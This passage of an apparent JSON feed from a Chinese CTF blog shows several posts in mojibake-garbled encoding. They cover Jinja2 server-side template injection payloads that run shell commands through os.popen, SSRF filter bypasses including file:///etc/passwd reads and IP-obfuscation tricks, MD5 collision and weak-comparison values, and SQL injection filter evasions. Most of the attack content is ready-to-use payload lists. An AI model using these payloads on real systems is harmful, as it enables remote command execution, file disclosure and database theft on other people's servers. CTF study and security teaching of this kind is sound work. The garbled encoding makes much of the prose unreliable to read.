class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[457].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h5 id=\"4ç¬¬ä¸‰æ–¹åº“ä½¿ç”¨load_moduleåŠ è½½os\"><a class=\"markdownIt-Anchor\" href=\"#4ç¬¬ä¸‰æ–¹åº“ä½¿ç”¨load_moduleåŠ è½½os\">#</a> 4. ç¬¬ä¸‰æ–¹åº“ï¼Œä½¿ç”¨ load_module åŠ è½½ os</h5>\n<p>python è„šæœ¬æ‰¾_frozen_importlib.BuiltinImporter</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;[].__class__.__base__.__subclasses__()[69][&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"linecacheå‡½æ•°\"><a class=\"markdownIt-Anchor\" href=\"#linecacheå‡½æ•°\">#</a> linecache å‡½æ•°</h4>\n<p>è¿™ä¸ªæœ¬æ¥æ˜¯è¯»å–ä»»æ„ä¸€ä¸ªæ–‡ä»¶æŸä¸€è¡Œçš„ï¼Œè€Œè¿™ä¸ªå‡½æ•°ä¹Ÿå¼•å…¥ os æ¨¡æ¿ï¼Œåˆ©ç”¨æ–¹æ³•åŒ 4, å…ˆæ‰¾ linecache æ¨¡å—ä½ç½®ï¼Œå†ç”¨ [â€˜linecacheâ€™][â€˜osâ€™]</p>\n<h5 id=\"subprocesspopenç±»\"><a class=\"markdownIt-Anchor\" href=\"#subprocesspopenç±»\">#</a> subprocess.Popen ç±»</h5>\n<p>è„šæœ¬æ‰¾ç±»ä½ç½®ï¼Œå‡è®¾æ˜¯ 496<br>\n åˆ©ç”¨æ–¹æ³•:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[496](&#x27;whoami&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"jinjiaæ ¼å¼\"><a class=\"markdownIt-Anchor\" href=\"#jinjiaæ ¼å¼\">#</a> jinjia æ ¼å¼</h3>\n<p><code>æ§åˆ¶ç»“æ„&#123;% %&#125;</code> <br>\n <code>å˜é‡å–å€¼&#123;&#123; &#125;&#125;</code> <br>\n <code>æ³¨é‡Š</code></p>\n<h3 id=\"äº†è§£pythonçš„å‡ ä¸ªå‡½æ•°è§£æ\"><a class=\"markdownIt-Anchor\" href=\"#äº†è§£pythonçš„å‡ ä¸ªå‡½æ•°è§£æ\">#</a> äº†è§£ python çš„å‡ ä¸ªå‡½æ•°è§£æ</h3>\n<p><em>class</em> è¿”å›è°ƒç”¨çš„å‚æ•°ç±»å‹<br>\n<em> bases</em> è¿”å›åŸºç±»åˆ—è¡¨<br>\n<em> mro</em> è¿”å›æ‰€æœ‰å­ç±»å…ƒç»„ï¼Œæœ€åä¸€ä¸ªä¸€èˆ¬æ˜¯ object<br>\n<em>subclasses</em> () è¿”å› object çš„å­ç±»<br>\n<em> globals</em> å‡½æ•°ä¼šä»¥å­—å…¸ç±»å‹è¿”å›å½“å‰ä½ç½®çš„å…¨éƒ¨å…¨å±€å˜é‡<br>\n<em> init</em> æ£€æŸ¥è¿™ä¸ªç±»æ˜¯å¦è¢«é‡è½½è¿‡ï¼Œä¸€èˆ¬æ²¡æœ‰ï¼Œæ²¡æœ‰å°±èƒ½åˆ©ç”¨ï¼Œæ²¡å¸¦ wapper å­—æ®µå°±æ˜¯æ²¡æœ‰<br>\n<strong> dic</strong> ä¿å­˜ç±»å®ä¾‹æˆ–å¯¹è±¡å®ä¾‹çš„å±æ€§å˜é‡é”®å€¼å¯¹å­—å…¸<br>\n<strong> builtins</strong> å†…å»ºåç§°ç©ºé—´ï¼Œå†…å»ºåç§°ç©ºé—´æœ‰è®¸å¤šåå­—åˆ°å¯¹è±¡ä¹‹é—´æ˜ å°„ï¼Œè€Œè¿™äº›åå­—å…¶å®å°±æ˜¯å†…å»ºå‡½æ•°çš„åç§°ï¼Œå¯¹è±¡å°±æ˜¯è¿™äº›å†…å»ºå‡½æ•°æœ¬èº«ã€‚å³é‡Œé¢æœ‰å¾ˆå¤šå¸¸ç”¨çš„å‡½æ•°<br>\n url_for flask çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__ï¼Œè€Œä¸” url_for.<strong>globals</strong>[â€˜<strong>builtins</strong>â€™] å«æœ‰ current_appã€‚<br>\nget_flashed_messages flask çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç”¨äºå¾—åˆ°__builtins__<br>\nos.popen () æ–¹æ³•ç”¨äºä»ä¸€ä¸ªå‘½ä»¤æ‰“å¼€ä¸€ä¸ªç®¡é“ã€‚</p>\n<h2 id=\"å¸¸è§payload\"><a class=\"markdownIt-Anchor\" href=\"#å¸¸è§payload\">#</a> å¸¸è§ payload</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[185].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/&#123;&#123; config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;`</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config.FLAG&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')&#125;&#125;</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;&lt;command&gt;&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;lipsum.__globals__.__getitem__(&quot;os&quot;).popen(&quot;cat flag&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&#123;&#123;a.__init__.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;`</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% for i in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;&#123;% if i.__name__==&#x27;Popen&#x27; %&#125;&#123;&#123; i.__init__.__globals__.__getitem__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>\n<p>å‚è€ƒ:<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8zNDc4NjUuaHRtbA==\">PYTHON SSTI çš„ä¸€äº› BYPASS - FreeBuf ç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzMyODIyMi5odG1s\"> CTF å¯¹ SSTI çš„ä¸€äº›æ€»ç»“ - FreeBuf ç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</span></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/30/SSRF/",
            "url": "https://hq185187.github.io/2023/04/30/SSRF/",
            "title": "SSRFç»•è¿‡",
            "date_published": "2023-04-30T15:53:24.221Z",
            "content_html": "<h3 id=\"åè®®\"><a class=\"markdownIt-Anchor\" href=\"#åè®®\">#</a> åè®®:</h3>\n<p>1.file åè®®</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file:///etc/passwd</span><br><span class=\"line\">file:///C:/Users/30779/Documents/password.txt</span><br></pre></td></tr></table></figure>\n<p>2.dict: å­—å…¸æœåŠ¡å™¨åè®®ï¼Œèƒ½è®¿é—®æ›´å¤šå­—å…¸æº</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?url=dict://ä¸»æœº/info</span><br><span class=\"line\">å¯ä»¥è·å–ç›®æ ‡æœåŠ¡å™¨ä¸Šè¿è¡Œçš„æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯</span><br></pre></td></tr></table></figure>\n<p>3.gopher åè®®ï¼šåˆ†å¸ƒå¼çš„æ–‡æ¡£ä¼ é€’æœåŠ¡</p>\n<h3 id=\"ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#ç»•è¿‡\">#</a> ç»•è¿‡</h3>\n<h4 id=\"1ipçš„é™åˆ¶\"><a class=\"markdownIt-Anchor\" href=\"#1ipçš„é™åˆ¶\">#</a> 1.IP çš„é™åˆ¶</h4>\n<p>(1)enclosed alphanumerics<br>\nâ‘  â‘¡ â‘¦.â“¿.â“¿.â‘ <br>\n(2) çŸ­ç½‘å€ (ç½‘å€ç¼©çŸ­)<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzZkdS5pbi8=\">http://6du.in/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXJsYy5jbi8=\">https://www.urlc.cn/</span><br>\n(3) å¥å·ä»£æ›¿ç‚¹<br>\n 127ã€‚0ã€‚0ã€‚1<br>\n (4) ç¼–ç ç»•è¿‡<br>\n 127.0.0.1<br>\n åå…­è¿›åˆ¶ï¼š7F000001    å‰é¢åŠ  0x<br>\n åè¿›åˆ¶ï¼š2130706433<br>\n å…«è¿›åˆ¶ï¼š17700000001     å‰åŠ  0, å¯ä»¥åŠ å¤šä¸ª<br>\n (5) çœç•¥ç»•è¿‡</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Windowsä¸‹0ä»£è¡¨0.0.0.0</span><br><span class=\"line\">Linuxä¸‹ä»£è¡¨127.0.0.1</span><br><span class=\"line\">http://0ä»£æ›¿127.0.0.1:</span><br><span class=\"line\">ping 0 -c 4</span><br><span class=\"line\">127.0.0.1ä¹‹é—´çš„0ä¹Ÿå¯ä»¥çœè·¯:</span><br><span class=\"line\">ping 127.1 -c 4</span><br></pre></td></tr></table></figure>\n<p>(6) 302 è·³è½¬</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class=\"line\">    header(&quot;Location: &#123;$_GET[&#x27;url&#x27;]&#125;&quot;);</span><br><span class=\"line\">    exit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>(7).@ç»•è¿‡<br>\nè®¿é—® <code>http://www.baidu.com@10.10.10.10</code>  ä¸ <code>http://10.10.10.10</code>  è¯·æ±‚æ˜¯ç›¸åŒçš„<br>\n (8) é…ç½®åŸŸå<br>\nåŠ é€Ÿæˆ‘ä»¬æ‰‹ä¸­æœ‰å¯æ§åŸŸåï¼Œå¯ä»¥å°†åŸŸå A è®°å½•æŒ‡å‘æƒ³è¦è¯·æ±‚çš„ IP è¿›è¡Œç»•è¿‡<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2V2aWwuZXhhbXBsZS5jb20=\"> evil.example.com</span> =&gt; 10.0.18.3</p>\n<p><mark>æ³¨æ„:php çš„ url è§£æ:</mark></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://a@127.0.0.1:80@baidu.com</span><br></pre></td></tr></table></figure>\n<p>å¯ä»¥å®ç°æ£€æµ‹ IP æ—¶æ˜¯æ­£å¸¸çš„ä¸€ä¸ªç½‘ç«™åŸŸåï¼Œè€Œå®é™… curl çš„æ˜¯ 127.0.0.1:80, ä»è€Œå®ç° ssrf</p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/30/md5/",
            "url": "https://hq185187.github.io/2023/04/30/md5/",
            "title": "MD5ç»•è¿‡æ€»ç»“",
            "date_published": "2023-04-29T16:53:12.476Z",
            "content_html": "<h3 id=\"md5\"><a class=\"markdownIt-Anchor\" href=\"#md5\">#</a> md5</h3>\n<h4 id=\"1md5å¼±ç±»å‹æ¯”è¾ƒ\"><a class=\"markdownIt-Anchor\" href=\"#1md5å¼±ç±»å‹æ¯”è¾ƒ\">#</a> 1.md5 å¼±ç±»å‹æ¯”è¾ƒ</h4>\n<p>(1) 0e ç»•è¿‡<br>\nä¸€äº›å¸¸è§çš„ md åŠ å¯†åè¿˜æ˜¯ 0e å¼€å¤´çš„</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">byGcY</span><br><span class=\"line\">0e591948146966052067035298880982</span><br><span class=\"line\"></span><br><span class=\"line\">QNKCDZO</span><br><span class=\"line\">0e830400451993494058024219903391</span><br><span class=\"line\"></span><br><span class=\"line\">s878926199a</span><br><span class=\"line\">0e545993274517709034328855841020</span><br><span class=\"line\"></span><br><span class=\"line\">s155964671a</span><br><span class=\"line\">0e342768416822451524974117254469</span><br><span class=\"line\"></span><br><span class=\"line\">s214587387a</span><br><span class=\"line\">0e848240448830537924465865611904</span><br><span class=\"line\"></span><br><span class=\"line\">s214587387a</span><br><span class=\"line\">0e848240448830537924465865611904</span><br><span class=\"line\"></span><br><span class=\"line\">s878926199a</span><br><span class=\"line\">0e545993274517709034328855841020</span><br><span class=\"line\"></span><br><span class=\"line\">s1091221200a</span><br><span class=\"line\">0e940624217856561557816327384675</span><br><span class=\"line\"></span><br><span class=\"line\">s1885207154a</span><br><span class=\"line\">0e509367213418206700842008763514</span><br><span class=\"line\"></span><br><span class=\"line\">240610708</span><br><span class=\"line\">0e462097431906509019562988736854</span><br><span class=\"line\"></span><br><span class=\"line\">314282422</span><br><span class=\"line\">0e990995504821699494520356953734</span><br><span class=\"line\"></span><br><span class=\"line\">571579406</span><br><span class=\"line\">0e972379832854295224118025748221</span><br><span class=\"line\"></span><br><span class=\"line\">903251147</span><br><span class=\"line\">0e174510503823932942361353209384</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>(2) æ•°ç»„ç»•è¿‡</p>\n<ol>\n<li>ç”±äº md5 ä¸èƒ½åŠ å¯†æ•°ç»„ï¼Œåœ¨åŠ å¯†æ•°ç»„çš„æ—¶å€™ä¼šè¿”å› NUL</li>\n<li>eg.``?param1[]=1&amp;param2[]=2</li>\n</ol>\n<h4 id=\"2åŒmd5åˆ¤æ–­\"><a class=\"markdownIt-Anchor\" href=\"#2åŒmd5åˆ¤æ–­\">#</a> 2. åŒ md5 åˆ¤æ–­</h4>\n<p>æœ‰äº›é¢˜ç›®å¯èƒ½éœ€è¦ç»è¿‡ä¸¤æ¬¡ md5 åŠ å¯†åˆ¤æ–­ï¼Œä¸€äº›ä¸¤æ¬¡ md5 åŠ å¯†å 0e å¼€å¤´çš„:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CbDLytmyGm2xQyaLNhWn 770hQgrBOjrcqftrlaZk 7r4lGXCH2Ksu2JNT3BYM</span><br></pre></td></tr></table></figure>\n<h4 id=\"3md5å¼ºç±»å‹æ¯”è¾ƒ\"><a class=\"markdownIt-Anchor\" href=\"#3md5å¼ºç±»å‹æ¯”è¾ƒ\">#</a> 3.md5 å¼ºç±»å‹æ¯”è¾ƒ</h4>\n<p>(1) æ•°ç»„ç»•è¿‡<br>\n (2) ä½¿ç”¨åŠ å¯†åä¸¤ä¸ªå®Œå…¨ç›¸ç­‰çš„ä¸¤ä¸ªå­—ç¬¦ä¸²ç»•è¿‡</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">äºŒè¿›åˆ¶md5åŠ å¯† ecd33e3e09ff2a58e1d9ed7189dc186b</span><br><span class=\"line\">urlç¼–ç  </span><br><span class=\"line\">ç¬¬ä¸€ä¸ªå‚æ•°:</span><br><span class=\"line\">abc%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D6%16y%AC%CE%C5%A1LrY5fn%94%10%D9%01%C3%AC%F8%AAN%21%D0%27%BE%3Ej%A7%22%0C%D08%D3%AF%DFRo%2F%A4%8B%E8%EB45j%E4h%9C%21%22%AB%7E%BC%8E%7C%17%9E%C3Xg%D7%A8%CDHt%BE%AB.%2FWb%3Eb%EA%FC%261%0F_%3D%AFo%3F%1E%DE%E8i%86%7D%BF%C7_Q%CDA%B4%CF%B8n%06Ir%7F%5C%A3k%F9%2AO%DFF%2A%F3%8BcH%FF%85%3F%0D%D0%9B%C7%C8-%12%92</span><br><span class=\"line\"></span><br><span class=\"line\">ç¬¬äºŒä¸ªå‚æ•°:</span><br><span class=\"line\">urlç¼–ç  abc%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%D6%16y%AC%CE%C5%A1LrY5fn%94%10%D9%01%C3%ACx%AAN%21%D0%27%BE%3Ej%A7%22%0C%D08%D3%AF%DFRo%2F%A4%8B%E8%EB45%EA%E4h%9C%21%22%AB%7E%BC%8E%7C%17%9E%C3%D8g%D7%A8%CDHt%BE%AB.%2FWb%3Eb%EA%FC%261%0F_%3D%AFo%BF%1E%DE%E8i%86%7D%BF%C7_Q%CDA%B4%CF%B8n%06Ir%7F%5C%A3k%F9%2A%CF%DEF%2A%F3%8BcH%FF%85%3F%0D%D0%9BG%C8-%12%92</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>ä¼ å‚:a = å‚æ•° 1&amp;b = å‚æ•° 2<mark> æ³¨æ„ä¸­é—´ä¸èƒ½æœ‰æ¢è¡Œç©ºæ ¼</mark></p>\n<p>== ä¸ºä»€ä¹ˆè¦ url ç¼–ç ï¼Ÿ== æœ‰ä¸å¯è§å­—ç¬¦<br>\nå†ç»™ä¸€ä¸ª payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">array1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;array2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2</span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/",
            "url": "https://hq185187.github.io/2023/04/29/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E7%BB%95%E8%BF%87/",
            "title": "SQLæ³¨å…¥ç»•è¿‡",
            "date_published": "2023-04-28T17:31:47.527Z",
            "content_html": "<h1 id=\"ä¸€å­—ç¬¦æ›¿æ¢\"><a class=\"markdownIt-Anchor\" href=\"#ä¸€å­—ç¬¦æ›¿æ¢\">#</a> ä¸€ã€‚å­—ç¬¦æ›¿æ¢</h1>\n<h3 id=\"1è¿‡æ»¤ç©ºæ ¼\"><a class=\"markdownIt-Anchor\" href=\"#1è¿‡æ»¤ç©ºæ ¼\">#</a> 1. è¿‡æ»¤ç©ºæ ¼</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%0a,%0b,%0c,%0d,%09,%a0(åªåœ¨ç‰¹å®šå­—ç¬¦é›†æ‰èƒ½åˆ©ç”¨),/**/,æ‹¬å·ç­‰</span><br></pre></td></tr></table></figure>\n<h3 id=\"2selectæ›¿æ¢æˆç©º\"><a class=\"markdownIt-Anchor\" href=\"#2selectæ›¿æ¢æˆç©º\">#</a> 2.select æ›¿æ¢æˆç©º</h3>\n<p>åŒå†™ selectselect</p>\n<h3 id=\"3å¤§å°å†™ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#3å¤§å°å†™ç»•è¿‡\">#</a> 3. å¤§å°å†™ç»•è¿‡</h3>\n<p>MySQL ä¸­æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œè‹¥æ˜¯è¿‡æ»¤äº† SELECT, å°±ç”¨ select ç»•è¿‡ï¼Œå…¶ä»–åŒç†</p>\n<h3 id=\"4æ­£åˆ™åŒ¹é…\"><a class=\"markdownIt-Anchor\" href=\"#4æ­£åˆ™åŒ¹é…\">#</a> 4. æ­£åˆ™åŒ¹é…</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">æ­£åˆ™åŒ¹é…\\bselect\\bå¯ä»¥ç”¨å½¢å¦‚/*!50000*/æ–¹æ³•ç»•è¿‡</span><br><span class=\"line\">/*!50000*/æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ³¨é‡Š,é‡Œé¢çš„SQLä¼šè¢«æ‰§è¡Œ,50000æ˜¯ä¸€ä¸ªç‰ˆæœ¬å·,å‡è®¾MySQLç‰ˆæœ¬å¤§äºè¿™ä¸ªç‰ˆæœ¬å·å°±æ‰§è¡Œé‡Œé¢çš„SQLè¯­å¥</span><br></pre></td></tr></table></figure>\n<h3 id=\"5æ›¿æ¢äº†å•å¼•å·æˆ–åŒå¼•å·å¿˜è®°äº†åæ–œæ \"><a class=\"markdownIt-Anchor\" href=\"#5æ›¿æ¢äº†å•å¼•å·æˆ–åŒå¼•å·å¿˜è®°äº†åæ–œæ \">#</a> 5. æ›¿æ¢äº†å•å¼•å·æˆ–åŒå¼•å·ï¼Œå¿˜è®°äº†åæ–œæ </h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM wp_news WHERE id=&#x27;å¯æ§ç‚¹1&#x27; AND title=&#x27;å¯æ§ç‚¹2&#x27;&quot;</span></span><br></pre></td></tr></table></figure>\n<p>ç»•è¿‡</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$sql</span>=<span class=\"string\">&quot;SELECT * FROM wp_news WHERE id=&#x27;a\\&#x27; AND title=&#x27;OR sleep(1)#&#x27;&quot;</span></span><br></pre></td></tr></table></figure>\n<p>ç¬¬ä¸€ä¸ªå¯æ§ç‚¹çš„åæ–œæ è½¬ä¹‰å¯æ§ç‚¹ 1 é¢„ç½®çš„å•å¼•å·ï¼Œå¯¼è‡´å¯æ§ç‚¹ 2 é€ƒé€¸å‡ºå•å¼•å·<br>\n eg</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span> <span class=\"operator\">*</span> <span class=\"keyword\">from</span> websites <span class=\"keyword\">where</span> id<span class=\"operator\">=</span><span class=\"string\">&#x27;a\\&#x27;</span> <span class=\"keyword\">and</span> url<span class=\"operator\">=</span><span class=\"string\">&#x27;union select 1,2,(select concat(id,0x7e,url)from websites limit 1)#&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<h3 id=\"äºŒé€ƒé€¸å¼•å·\"><a class=\"markdownIt-Anchor\" href=\"#äºŒé€ƒé€¸å¼•å·\">#</a> äºŒã€‚é€ƒé€¸å¼•å·</h3>\n<p>æ³¨å…¥çš„é‡ç‚¹æ˜¯é€ƒé€¸å¼•å·ï¼Œä½†å¼€å‘è€…å¾€å¾€ä¼šåšä¸€æ¬¡ addslashes (è½¬ä¹‰å•åŒå¼•å·ï¼Œåæ–œæ ), æ€ä¹ˆç»•è¿‡</p>\n<h3 id=\"1ç¼–ç è§£ç \"><a class=\"markdownIt-Anchor\" href=\"#1ç¼–ç è§£ç \">#</a> 1. ç¼–ç è§£ç </h3>\n<p>å®½å­—èŠ‚æ³¨å…¥ï¼Œç¨åè¯´</p>\n<h3 id=\"2æ„æ–™ä¹‹å¤–çš„æ³¨å…¥ç‚¹\"><a class=\"markdownIt-Anchor\" href=\"#2æ„æ–™ä¹‹å¤–çš„æ³¨å…¥ç‚¹\">#</a> 2. æ„æ–™ä¹‹å¤–çš„æ³¨å…¥ç‚¹</h3>\n<p>å¼€å‘è€…åœ¨è½¬ä¹‰ç”¨æˆ·è¾“å…¥æ—¶é—æ¼äº†ä¸€äº›å¯æ³¨å…¥ç‚¹.PHP: æ–‡ä»¶çš„ä¸Šä¼ åï¼Œhttp header,$SERVER [â€˜PHP_SELFâ€™] è¿™äº›å˜é‡ï¼Œç¨åä¸¾ä¾‹</p>\n<h3 id=\"3äºŒæ¬¡æ³¨å…¥\"><a class=\"markdownIt-Anchor\" href=\"#3äºŒæ¬¡æ³¨å…¥\">#</a> 3. äºŒæ¬¡æ³¨å…¥</h3>\n<table>\n<thead>\n<tr>\n<th 